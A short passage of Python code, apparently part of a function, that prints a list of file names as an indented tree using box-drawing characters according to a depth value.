    if isinstance(tree, str):
        tree = [tree]
    if isinstance(tree, list):
        if not depth:
            new_tree = ["├─" + file.split("/")[-1] for file in tree]
            print("\n".join(new_tree))
        else:
            new_tree = [
                "│" + "  │" * (depth - 1) + "  " + "├─" + file.split("/")[-1]
                for file in tree
            ]
            print("\n".join(new_tree))
